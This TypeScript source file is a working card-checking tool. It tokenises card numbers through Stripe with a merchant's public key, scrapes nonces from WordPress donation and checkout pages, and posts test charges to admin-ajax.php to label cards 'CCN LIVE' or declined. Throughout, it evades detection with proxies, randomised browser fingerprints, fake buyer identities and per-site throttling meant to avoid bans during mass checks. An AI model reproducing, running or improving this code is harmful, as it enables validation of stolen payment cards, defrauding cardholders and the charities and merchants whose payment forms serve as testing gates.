/**
 * stripe-checker2.ts — Generic Stripe admin-ajax checker for py/json-imported gates.
 *
 * Handles gates whose settings were extracted from a Python checker script or a
 * network-capture JSON/HAR file.  Those gates have:
 *   - settings.ajaxAction  — the WordPress admin-ajax `action=` value
 *   - settings.liveOverrides / settings.deadOverrides — classification keywords
 *     imported from the script's success_keys / declined_keys arrays
 *
 * The checker:
 *   1. Tokenises the card via Stripe (tok_ or pm_)
 *   2. Scrapes the merchant page for a nonce + form fields (best-effort)
 *   3. POSTs to {siteUrl}/wp-admin/admin-ajax.php with the action + token
 *   4. Classifies the text response using the imported keyword lists
 */

import crypto from "crypto";
import {
  pick, BILLING_DATA, pickBilling, dbg,
  getProxy, getProxyDispatcher, parseCookies, mergeCookies,
  formatCardResult,
  CCN_LIVE_CODES, CCN_WRONG_CVV_CODES, DEAD_CODES, STRIPE_DECLINE_MAP,
  type CheckResult,
} from "./stripe-checker";
import { shouldForceDead } from "./classifier-mode";
import { generateRandom } from "./ua-generator";
import { waitSiteCooldown, siteCooldown } from "./site-cache";

// ── Local helpers (not exported from stripe-checker.ts) ──────────────────────

const STRIPE_JS_VERSIONS = [
  "7ab2721f84", "cfa7bc6281", "67480e0cc3",
  "a7b74c0b44", "b8c85d1e55", "c9d96e2f66",
];

const EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"];

function rndStr(n: number): string {
  return Array.from({ length: n }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("");
}
function rndEmail(): string {
  return `${rndStr(8)}${Math.floor(Math.random() * 9000) + 1000}@${pick(EMAIL_DOMAINS)}`;
}
function rndName(): string {
  const first = ["James", "Mary", "John", "Emma", "Robert", "Sarah", "Michael", "Laura", "David", "Anna"];
  const last  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"];
  return `${pick(first)} ${pick(last)}`;
}

// Live signals = canonical CCN_LIVE_CODES (exact Stripe error codes)
// plus human-readable text patterns that WP sites surface in their HTML/JSON responses.
// Derived from the shared CCN_LIVE_CODES list so they stay in sync with stripe-checker.ts.
const BUILTIN_LIVE_SIGNALS: string[] = [
  ...CCN_LIVE_CODES,
  ...CCN_WRONG_CVV_CODES,
  // WP-rendered text equivalents
  "card was declined", "your card was declined", "declined by the issuer",
  "do not honor", "insufficient funds", "limit exceeded",
];

// Dead signals = canonical DEAD_CODES plus WP site text patterns.
const BUILTIN_DEAD_SIGNALS: string[] = [
  ...DEAD_CODES,
  "invalid_expiry",  // not in DEAD_CODES by that name
  "card number is not valid", "invalid card", "card has been declined",
  "the card has expired",
];

// Nonce-not-found / retry signals
const NONCE_ERRORS = new Set([
  "nonce verification failed", "invalid nonce", "nonce is invalid",
  "are you sure you want to do this", "session expired", "session error",
  "sorry, your session has expired", "unable to recognize your session",
]);

// ── Extras interface ──────────────────────────────────────────────────────────

export interface AdminAjaxExtras {
  ajaxAction?:        string;
  paymentMode?:       string;
  giveFormId?:        string;
  gfFormId?:          string;
  chargeAmount?:      string;
  donateAmount?:      string;
  donatePath?:        string;
  // Billing — flows from gate settings so each check looks like a real buyer,
  // not the same hardcoded address on every card.
  billingFirstName?:  string;
  billingLastName?:   string;
  billingEmail?:      string;
  billingAddress?:    string;
  billingCity?:       string;
  billingState?:      string;
  billingZip?:        string;
  billingCountry?:    string;
  liveOverrides?:     string[];
  deadOverrides?:     string[];
  connectedAccount?:  string;
  proxyOverride?:     string;
  proxyCountry?:      string;
  timeout?:           number;
  rawCookies?:        string;
}

// ── Tokenise card via Stripe ──────────────────────────────────────────────────

export async function tokenizeCard(
  cc: string, mm: string, yy: string, cvv: string,
  publicKey: string, siteUrl: string,
  proxyUrl?: string | null,
  timeout?: number,
): Promise<{ tokenId: string; pmId: string; brand: string; funding: string; country: string; threeDs: string; error?: string }> {
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const billing = await pickBilling(cc);
  const name = rndName();
  const email = rndEmail();
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;
  const refDomain = siteUrl || "https://js.stripe.com";

  const headers: Record<string, string> = {
    "Content-Type": "application/x-www-form-urlencoded",
    Accept: "application/json",
    "accept-language": "en-US,en;q=0.9",
    Origin: "https://js.stripe.com",
    Referer: "https://js.stripe.com/",
    "User-Agent": ua,
    "sec-ch-ua": secChUa,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
  };

  const surfaces = [
    { type: "token" as const, surface: "card-element",     endpoint: "tokens" },
    { type: "pm"    as const, surface: "payment-element",  endpoint: "payment_methods" },
    { type: "pm"    as const, surface: "card-element",     endpoint: "payment_methods" },
  ];

  let tokenId = "";
  let pmId    = "";
  let brand   = "UNKNOWN";
  let funding = "unknown";
  let country = "??";
  let threeDs = "";
  let lastError = "";

  for (const { type, surface, endpoint } of surfaces) {
    const body = new URLSearchParams();
    if (type === "token") {
      body.set("card[number]",          cc);
      body.set("card[cvc]",             cvv);
      body.set("card[exp_month]",       mm);
      body.set("card[exp_year]",        yy);
      body.set("card[name]",            name);
      body.set("card[address_zip]",     billing.zip);
      body.set("card[address_country]", billing.country);
    } else {
      body.set("type",                                    "card");
      body.set("billing_details[name]",                  name);
      body.set("billing_details[email]",                 email);
      body.set("billing_details[address][line1]",        (billing as any).line1 || "123 Main St");
      body.set("billing_details[address][city]",         billing.city);
      body.set("billing_details[address][state]",        billing.stateCode);
      body.set("billing_details[address][postal_code]",  billing.zip);
      body.set("billing_details[address][country]",      billing.country);
      body.set("card[number]",                           cc);
      body.set("card[cvc]",                              cvv);
      body.set("card[exp_month]",                        mm);
      body.set("card[exp_year]",                         yy);
    }
    body.set("guid",               crypto.randomUUID());
    body.set("muid",               crypto.randomUUID());
    body.set("sid",                crypto.randomUUID());
    body.set("payment_user_agent", `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; ${surface}`);
    body.set("referrer",           refDomain);
    body.set("time_on_page",       String(Math.floor(Math.random() * 30000) + 5000));
    body.set("key",                publicKey);

    try {
      const fetchOpts: any = {
        method: "POST",
        headers,
        body: body.toString(),
        signal: AbortSignal.timeout(timeout || 12000),
      };

      if (proxyUrl) {
        const dispatcher = await getProxyDispatcher(proxyUrl);
        if (dispatcher) fetchOpts.dispatcher = dispatcher;
      }

      const resp = await fetch(`https://api.stripe.com/v1/${endpoint}`, fetchOpts);
      const data = await resp.json() as any;

      if (data.id) {
        const card = data.card || {};
        brand   = (card.brand   || "unknown").toUpperCase();
        funding = card.funding  || "unknown";
        country = card.country  || "??";
        threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
        if (type === "token") tokenId = data.id;
        else                  pmId    = data.id;
        break;
      }

      const errMsg = data?.error?.message || "";
      lastError = data?.error?.code || errMsg;
      // Surface-blocked → try next surface; otherwise stop.
      if (!errMsg.includes("integration surface") && !errMsg.includes("publishable key")) {
        break;
      }
    } catch (e: any) {
      lastError = e.message;
      continue;
    }
  }

  if (!tokenId && !pmId) {
    return { tokenId: "", pmId: "", brand, funding, country, threeDs, error: lastError };
  }
  return { tokenId, pmId, brand, funding, country, threeDs };
}

// ── Page-scrape for nonce + form fields ──────────────────────────────────────

interface ScrapedNonces {
  formNonce:      string;  // generic give-form-nonce
  giveFormHash:   string;  // GiveWP session hash (real gate auth)
  giveFormIdUsed: string;  // detected/confirmed form id
  wpNonce:        string;  // _wpnonce
  wcNonce:        string;  // WC checkout nonce
  cookies:        string;
}

async function scrapeNonces(
  siteUrl: string,
  formId: string | undefined,
  ua: string,
  cookies: string,
  donatePath?: string,
  proxyUrl?: string | null,
  timeout = 12000,
): Promise<ScrapedNonces> {
  const result: ScrapedNonces = {
    formNonce: "", giveFormHash: "", giveFormIdUsed: formId || "",
    wpNonce: "", wcNonce: "", cookies,
  };

  // Build candidate paths — custom donatePath first, then common GiveWP paths,
  // then WC/generic paths. If we know the form ID, also try query-param variants
  // since some themes require ?give-form-id=N on the URL to render the form.
  const basePaths: string[] = [];
  if (donatePath) {
    const dp = donatePath.startsWith("/") ? donatePath : "/" + donatePath;
    basePaths.push(dp.endsWith("/") ? dp : dp + "/");
  }
  basePaths.push(
    "/donate/", "/give/", "/donation/", "/support/", "/contribute/",
    "/donate/donation-form/", "/donation-form/", "/checkout/", "/",
  );

  // Deduplicate while preserving order
  const seen = new Set<string>();
  const paths: string[] = [];
  for (const p of basePaths) {
    if (!seen.has(p)) { seen.add(p); paths.push(p); }
    // Also try with give-form-id query param if we have an ID
    if (formId) {
      const withId = `${p}?give-form-id=${formId}`;
      if (!seen.has(withId)) { seen.add(withId); paths.push(withId); }
    }
  }

  let currentCookies = cookies;

  for (const path of paths) {
    try {
      const fetchOpts: any = {
        headers: {
          "User-Agent": ua,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "accept-language": "en-US,en;q=0.9",
          Cookie: currentCookies,
        },
        redirect: "follow",
        signal: AbortSignal.timeout(timeout),
      };
      if (proxyUrl) {
        const dispatcher = await getProxyDispatcher(proxyUrl);
        if (dispatcher) fetchOpts.dispatcher = dispatcher;
      }

      const resp = await fetch(`${siteUrl}${path}`, fetchOpts);
      const newCookies = parseCookies(resp.headers);
      currentCookies = mergeCookies(currentCookies, newCookies);
      result.cookies = currentCookies;

      if (!resp.ok) continue;
      const html = await resp.text();

      // GiveWP hash (the real session token on most GiveWP sites)
      const hashMatch = html.match(/name="give-form-hash"[^>]*value="([^"]+)"/)
        || html.match(/value="([^"]+)"[^>]*name="give-form-hash"/);
      if (hashMatch && !result.giveFormHash) result.giveFormHash = hashMatch[1];

      // Standard give-form-nonce
      const nonceMatch = html.match(/name="give-form-nonce"[^>]*value="([^"]+)"/)
        || html.match(/value="([^"]+)"[^>]*name="give-form-nonce"/);
      if (nonceMatch && !result.formNonce) result.formNonce = nonceMatch[1];

      // _wpnonce
      const wpNonceMatch = html.match(/name="_wpnonce"[^>]*value="([^"]+)"/)
        || html.match(/"_wpnonce"\s*:\s*"([^"]+)"/);
      if (wpNonceMatch && !result.wpNonce) result.wpNonce = wpNonceMatch[1];

      // WooCommerce checkout nonce
      const wcMatch = html.match(/woocommerce-process-checkout-nonce[^>]*value="([^"]+)"/)
        || html.match(/"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"/);
      if (wcMatch && !result.wcNonce) result.wcNonce = wcMatch[1];

      // Form id from page if not provided
      if (!result.giveFormIdUsed) {
        const fidMatch = html.match(/name="give-form-id"[^>]*value="(\d+)"/)
          || html.match(/data-id="(\d+)"/)
          || html.match(/form-id[=](\d+)/);
        if (fidMatch) result.giveFormIdUsed = fidMatch[1];
      }

      // Stop once we have the critical nonces
      if (result.giveFormHash || (result.formNonce && result.giveFormIdUsed)) break;
    } catch { continue; }
  }

  return result;
}

// ── Classify admin-ajax response text ────────────────────────────────────────

type CheckStatus = "live" | "dead" | "error";

/** Strip HTML tags from WooCommerce messages like <ul class="wc-error"><li>msg</li></ul> */
function stripHtml(s: string): string {
  return s.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
}

/**
 * Extract every meaningful text snippet from a parsed WP JSON response
 * so the caller can run keyword matching against real content, not raw JSON.
 */
function extractMessages(parsed: any): string[] {
  const msgs: string[] = [];
  const add = (v: any) => {
    if (!v) return;
    if (typeof v === "string") msgs.push(stripHtml(v));
    else if (typeof v === "object") msgs.push(stripHtml(JSON.stringify(v)));
  };

  // GiveWP: { success, data: { error: { message } } }
  add(parsed?.data?.error?.message);
  add(parsed?.data?.error?.code);
  // WP-ajax generic: { success, data: { message } } or { success, data: "string" }
  add(parsed?.data?.message);
  if (typeof parsed?.data === "string") add(parsed.data);
  // WooCommerce checkout: { result, messages: "<html>" }
  add(parsed?.messages);
  // WC payment intents: { result, payment_result: { messages } }
  add(parsed?.payment_result?.messages);
  add(parsed?.payment_result?.payment_status);
  // GravityForms: { is_valid, validation_messages: { fieldId: "msg" } }
  if (parsed?.validation_messages && typeof parsed.validation_messages === "object") {
    for (const v of Object.values(parsed.validation_messages)) add(v as any);
  }
  add(parsed?.confirmation_message);
  // Generic top-level error/message
  add(parsed?.message);
  add(parsed?.error);
  add(parsed?.error_message);
  add(parsed?.msg);
  return msgs.filter(Boolean);
}

function classify(
  text: string,
  liveOverrides: string[] | undefined,
  deadOverrides: string[] | undefined,
): CheckStatus {
  const lower = text.toLowerCase();

  // Admin-specified overrides win first
  for (const kw of (liveOverrides || [])) {
    if (kw && lower.includes(kw.toLowerCase())) return "live";
  }
  for (const kw of (deadOverrides || [])) {
    if (kw && lower.includes(kw.toLowerCase())) return "dead";
  }

  // Nonce errors → retry-worthy, not a card decline
  for (const err of NONCE_ERRORS) {
    if (lower.includes(err)) return "error";
  }

  // ── JSON parsing: covers all known WP plugin response shapes ─────────────
  try {
    const parsed = JSON.parse(text);

    // ── Unambiguous success signals ─────────────────────────────────────────
    // GiveWP / WP-ajax: { success: true }
    if (parsed?.success === true) return "live";
    // WooCommerce checkout: { result: "success" }
    if (parsed?.result === "success") return "live";
    // WC payment intents: { payment_result: { payment_status: "success" } }
    if (parsed?.payment_result?.payment_status === "success") return "live";
    // GravityForms: { is_valid: true }
    if (parsed?.is_valid === true) return "live";
    // Generic: { status: "success" } or { code: "success" }
    if (parsed?.status === "success" || parsed?.code === "success") return "live";

    // ── Unambiguous failure signals ─────────────────────────────────────────
    // GiveWP / WP-ajax: { success: false }
    if (parsed?.success === false) {
      const msgs = extractMessages(parsed);
      // Run built-in live signals on extracted messages — covers "insufficient_funds"
      // appearing inside a GiveWP error block that still means the card is live.
      const combined = msgs.join(" ").toLowerCase();
      for (const sig of BUILTIN_LIVE_SIGNALS) {
        if (combined.includes(sig)) return "live";
      }
      // Otherwise any message content → card was definitely rejected
      if (msgs.length) return "dead";
    }
    // WooCommerce: { result: "failure" }
    if (parsed?.result === "failure") {
      const msgs = extractMessages(parsed);
      const combined = msgs.join(" ").toLowerCase();
      for (const sig of BUILTIN_LIVE_SIGNALS) {
        if (combined.includes(sig)) return "live";
      }
      return "dead";
    }
    // WC payment intents failed
    if (parsed?.payment_result?.payment_status === "failed") {
      const msgs = extractMessages(parsed);
      const combined = msgs.join(" ").toLowerCase();
      for (const sig of BUILTIN_LIVE_SIGNALS) {
        if (combined.includes(sig)) return "live";
      }
      return "dead";
    }
    // GravityForms: { is_valid: false }
    if (parsed?.is_valid === false) {
      const msgs = extractMessages(parsed);
      const combined = msgs.join(" ").toLowerCase();
      for (const sig of BUILTIN_LIVE_SIGNALS) {
        if (combined.includes(sig)) return "live";
      }
      return msgs.length ? "dead" : "error";
    }

    // ── Run keyword matching on all extracted text snippets ─────────────────
    const allMsgs = extractMessages(parsed).join(" ").toLowerCase();
    if (allMsgs) {
      for (const sig of BUILTIN_LIVE_SIGNALS) {
        if (allMsgs.includes(sig)) return "live";
      }
      for (const sig of BUILTIN_DEAD_SIGNALS) {
        if (allMsgs.includes(sig)) return "dead";
      }
    }
  } catch { /* not JSON — fall through to text scan */ }

  // ── Plain-text / HTML fallback ────────────────────────────────────────────
  for (const sig of BUILTIN_LIVE_SIGNALS) {
    if (lower.includes(sig)) return "live";
  }
  for (const sig of BUILTIN_DEAD_SIGNALS) {
    if (lower.includes(sig)) return "dead";
  }

  if (lower.includes("payment complete") || lower.includes("thank you for your donation") ||
      lower.includes("donation received") || lower.includes("order received")) {
    return "live";
  }
  if (lower.includes("payment failed") || lower.includes("error processing") ||
      lower.includes("card was declined") || lower.includes("transaction declined")) {
    return "dead";
  }

  return "error";
}

// ── Build admin-ajax POST body from action + scraped + settings ───────────────

function buildAjaxBody(
  action: string,
  tokenId: string,
  pmId: string,
  nonces: ScrapedNonces,
  extras: AdminAjaxExtras,
  siteUrl: string,
): URLSearchParams {
  const body = new URLSearchParams();
  body.set("action", action);

  const amount = extras.chargeAmount || extras.donateAmount || "1.00";
  const a = action.toLowerCase();

  // Billing — use gate settings if provided, else pick random from BILLING_DATA pool
  const billingFallback = pick(BILLING_DATA) as any;
  const rndFullName  = rndName();
  const rndNameParts = rndFullName.split(" ");
  const firstName = extras.billingFirstName  || rndNameParts[0]               || "Test";
  const lastName  = extras.billingLastName   || rndNameParts.slice(1).join(" ") || "User";
  const email     = extras.billingEmail      || rndEmail();
  const address   = extras.billingAddress    || billingFallback.line1  || "123 Main St";
  const city      = extras.billingCity       || billingFallback.city   || "New York";
  const state     = extras.billingState      || billingFallback.stateCode  || "NY";
  const zip       = extras.billingZip        || billingFallback.zip    || "10001";
  const country   = extras.billingCountry    || billingFallback.country || "US";

  // ── GiveWP ───────────────────────────────────────────────────────────────
  if (a.includes("give") || a.includes("donation")) {
    const formId = nonces.giveFormIdUsed || extras.giveFormId || "1";
    const dpPath = extras.donatePath ? (extras.donatePath.startsWith("/") ? extras.donatePath : "/" + extras.donatePath) : "/donate/";
    body.set("give-form-id",     formId);
    body.set("give-price-id",    "custom");
    body.set("give-amount",      amount);
    body.set("payment-mode",     extras.paymentMode || "stripe");
    body.set("give-current-url", siteUrl + dpPath);
    body.set("give-form-title",  "Donation");
    body.set("give_first",       firstName);
    body.set("give_last",        lastName);
    body.set("give_email",       email);
    body.set("card_name",        `${firstName} ${lastName}`);
    body.set("card_address",     address);
    body.set("card_address_2",   "");
    body.set("card_city",        city);
    body.set("card_state",       state);
    body.set("card_zip",         zip);
    body.set("card_country",     country);
    if (nonces.giveFormHash) {
      body.set("give-form-hash",               nonces.giveFormHash);
      body.set("give-form-user-register-hash", nonces.giveFormHash);
    }
    if (nonces.formNonce) body.set("give-form-nonce", nonces.formNonce);
    if (nonces.wpNonce)   body.set("_wpnonce",        nonces.wpNonce);
    if (tokenId) body.set("card", tokenId);
    if (pmId)    body.set("give-stripe-payment-method", pmId);
  }

  // ── Charitable ───────────────────────────────────────────────────────────
  else if (a.includes("charitable")) {
    body.set("campaign_id",                  "1");
    body.set("amount",                       amount);
    body.set("payment_method",               "stripe");
    body.set("donor[email]",                 email);
    body.set("donor[first_name]",            firstName);
    body.set("donor[last_name]",             lastName);
    body.set("donor[address][line1]",        address);
    body.set("donor[address][city]",         city);
    body.set("donor[address][state]",        state);
    body.set("donor[address][postcode]",     zip);
    body.set("donor[address][country]",      country);
    if (nonces.formNonce) body.set("_charitable_donation_nonce", nonces.formNonce);
    if (tokenId) body.set("stripe_source",   tokenId);
    else if (pmId) body.set("stripe_token",  pmId);
  }

  // ── WooCommerce Stripe ────────────────────────────────────────────────────
  else if (a.includes("wc_stripe") || a.includes("woocommerce")) {
    body.set("payment_method",               "stripe");
    body.set("woocommerce-process-checkout-nonce", nonces.wcNonce || nonces.wpNonce);
    body.set("_wpnonce",                     nonces.wpNonce);
    body.set("billing_first_name",           firstName);
    body.set("billing_last_name",            lastName);
    body.set("billing_email",                email);
    body.set("billing_address_1",            address);
    body.set("billing_city",                 city);
    body.set("billing_state",                state);
    body.set("billing_postcode",             zip);
    body.set("billing_country",              country);
    body.set("stripe_source",                tokenId || pmId);
    body.set("stripe_payment_method",        pmId || tokenId);
  }

  // ── Generic wp_stripe / WP Full Stripe / custom ───────────────────────────
  else {
    body.set("stripe_token",        tokenId || pmId);
    body.set("token",               tokenId || pmId);
    body.set("payment_method",      pmId || tokenId);
    body.set("amount",              amount);
    body.set("currency",            "USD");
    body.set("billing_first_name",  firstName);
    body.set("billing_last_name",   lastName);
    body.set("billing_address",     address);
    body.set("billing_city",        city);
    body.set("billing_state",       state);
    body.set("billing_zip",         zip);
    body.set("billing_country",     country);
    if (nonces.wpNonce) {
      body.set("_wpnonce",          nonces.wpNonce);
      body.set("nonce",             nonces.wpNonce);
    }
  }

  return body;
}

// ── Main exported function ────────────────────────────────────────────────────

/**
 * Check a card against a py/json-imported gate using its captured admin-ajax action.
 *
 * Falls back gracefully:
 *   - If the POST returns a nonce error → classifies as "error" (retryable)
 *   - If no token is produced → returns Stripe's decline reason directly
 *   - If action is empty → returns the tokenize-only result
 */
export async function checkCardStripeAdminAjax(
  cardNumber: string,
  expMonth:   string,
  expYear:    string,
  cvv:        string,
  publicKey:  string,
  gateName:   string,
  siteUrl:    string,
  extras:     AdminAjaxExtras,
): Promise<CheckResult> {
  const start = Date.now();
  let mm = expMonth.trim().padStart(2, "0");
  let yy = expYear.trim();
  if (yy.length === 2) yy = "20" + yy;
  const fullCardInfo = `${cardNumber.trim()}|${mm}|${yy}|${cvv.trim()}`;
  const cleanSite = siteUrl.replace(/\/+$/, "");
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;
  const liveKw = extras.liveOverrides;
  const deadKw = extras.deadOverrides;
  const proxyUrl = extras.proxyOverride || (await getProxy(extras.proxyCountry)) || undefined;
  const reqTimeout = extras.timeout || 20000;

  // ── Site cooldown (item 6) ────────────────────────────────────────────────
  // Throttle per-site the same way stripe-checker.ts does to prevent hammering
  // a WP site during mass-check and triggering rate limits or IP bans.
  if (cleanSite) await waitSiteCooldown(cleanSite);

  // ── Step 1: Tokenise ──────────────────────────────────────────────────────
  const tok = await tokenizeCard(cardNumber.trim(), mm, yy, cvv.trim(), publicKey, cleanSite, proxyUrl, extras.timeout);

  const cardDesc = `${tok.brand} ${tok.funding} [${tok.country}]${tok.threeDs ? " " + tok.threeDs : ""}`;

  if (!tok.tokenId && !tok.pmId) {
    // Stripe itself rejected the card at tokenization — classify error code
    const code = tok.error || "unknown";
    const isDeadCode = BUILTIN_DEAD_SIGNALS.some(s => code.toLowerCase().includes(s.split("_")[0])) || deadKw?.some(kw => code.toLowerCase().includes(kw.toLowerCase()));
    const isLiveCode = BUILTIN_LIVE_SIGNALS.some(s => code.toLowerCase().includes(s.split("_")[0])) || liveKw?.some(kw => code.toLowerCase().includes(kw.toLowerCase()));
    const tier = isLiveCode ? "CCN LIVE" : "DECLINED";
    return {
      status: isLiveCode ? "live" : isDeadCode ? "dead" : "error",
      response: formatCardResult({
        tier, mark: isLiveCode ? "⚡" : "✗",
        detail: code,
        brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
      }),
      code,
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
      tokenId: "",
    };
  }

  const usedToken = tok.tokenId || tok.pmId;

  // ── No ajaxAction / no site — cannot proceed to charge step ─────────────
  // Tokenizing ≠ live: the card could still be blocked on the merchant site.
  // Return "error" so the admin knows the gate config is incomplete.
  const action = extras.ajaxAction || "";
  if (!action || !cleanSite) {
    return {
      status: "error",
      response: formatCardResult({
        tier: "GATEWAY", mark: "?",
        detail: "Tokenized — gate config incomplete (no ajax action)",
        brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
        tokenId: usedToken,
      }),
      code: "tokenized_only",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
      tokenId: usedToken,
    };
  }

  // ── Step 2: Scrape nonces from page ──────────────────────────────────────
  let nonces: ScrapedNonces = {
    formNonce: "", giveFormHash: "", giveFormIdUsed: extras.giveFormId || "",
    wpNonce: "", wcNonce: "", cookies: extras.rawCookies || "",
  };

  try {
    nonces = await scrapeNonces(cleanSite, extras.giveFormId, ua, extras.rawCookies || "", extras.donatePath, proxyUrl, reqTimeout);
  } catch (e: any) {
    dbg(`[checker2] ${gateName}: nonce scrape failed — ${e.message}`);
  }

  // ── Step 3: POST to admin-ajax.php ────────────────────────────────────────
  const ajaxUrl = `${cleanSite}/wp-admin/admin-ajax.php`;
  const postBody = buildAjaxBody(action, tok.tokenId, tok.pmId, nonces, extras, cleanSite);

  const fetchOpts: any = {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": ua,
      Accept: "application/json, text/javascript, */*; q=0.01",
      "Accept-Language": "en-US,en;q=0.9",
      "X-Requested-With": "XMLHttpRequest",
      Origin: cleanSite,
      Referer: cleanSite + "/",
      Cookie: nonces.cookies,
    },
    body: postBody.toString(),
    signal: AbortSignal.timeout(reqTimeout),
  };

  if (proxyUrl) {
    const dispatcher = await getProxyDispatcher(proxyUrl);
    if (dispatcher) fetchOpts.dispatcher = dispatcher;
  }

  // ── Step 4: POST and classify response ───────────────────────────────────
  let httpStatus = 0;
  let responseText = "";
  try {
    const resp = await fetch(ajaxUrl, fetchOpts);
    httpStatus = resp.status;
    responseText = await resp.text();
    dbg(`[checker2] ${gateName}: ajax response (${resp.status}): ${responseText.slice(0, 300)}`);
  } catch (e: any) {
    return {
      status: "error",
      response: formatCardResult({
        tier: "GATEWAY", mark: "✗",
        detail: `Network error: ${e.message?.slice(0, 60)}`,
        brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
        tokenId: usedToken,
      }),
      code: "network_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
      tokenId: usedToken,
      rawSnippet: e.message,
    };
  }

  // Record site activity for cooldown tracking (item 6)
  if (cleanSite) siteCooldown.recordCheck(cleanSite);

  let status = classify(responseText, liveKw, deadKw);
  const latency = Date.now() - start;
  const snippet = responseText.slice(0, 800);

  // Extract a human-readable reason from the response
  let reason = "";
  let extractedCode = "";
  try {
    const parsed = JSON.parse(responseText);
    const msgs = extractMessages(parsed);
    reason = msgs.find(m => m.length > 3) || "";
    if (!reason && parsed?.confirmation_message) reason = String(parsed.confirmation_message);
    // Pull the raw Stripe error code for shouldForceDead + DECLINE_MAP lookup
    extractedCode = parsed?.data?.error?.code || parsed?.error?.code || parsed?.code || "";
  } catch {
    reason = responseText.split("\n").find(l => l.trim().length > 5)?.trim() || responseText;
  }
  reason = reason.replace(/\s+/g, " ").trim().slice(0, 160);

  // Map raw Stripe code to human label if one exists (item 2)
  if (extractedCode && STRIPE_DECLINE_MAP[extractedCode]) {
    reason = STRIPE_DECLINE_MAP[extractedCode] + (reason ? ` — ${reason}` : "");
  }

  // shouldForceDead override (item 4) — strict mode can downgrade a "live" to "dead"
  if (status === "live" && extractedCode && shouldForceDead(extractedCode)) {
    status = "dead";
  }

  const httpNote = (httpStatus && httpStatus !== 200) ? `HTTP ${httpStatus}` : undefined;
  const nonceNote = status === "live" && nonces.wpNonce ? "nonce ✓" : undefined;
  const detail = reason || (status === "live" ? "Approved by site" : status === "dead" ? "Declined by site" : "Unrecognised response");

  let response: string;
  if (status === "live") {
    response = formatCardResult({
      tier: "CCN LIVE", mark: "⚡",
      detail,
      brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
      note: nonceNote,
      tokenId: usedToken,
    });
  } else if (status === "dead") {
    response = formatCardResult({
      tier: "DECLINED", mark: "✗",
      detail,
      brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
      note: httpNote,
      tokenId: usedToken,
    });
  } else {
    response = formatCardResult({
      tier: "GATEWAY", mark: "✗",
      detail,
      brand: tok.brand, funding: tok.funding, country: tok.country, threeDs: tok.threeDs,
      note: httpNote,
      tokenId: usedToken,
    });
  }

  return {
    status,
    response,
    code: extractedCode || reason.slice(0, 50) || status,
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
    tokenId: usedToken,
    rawSnippet: snippet,
  };
}
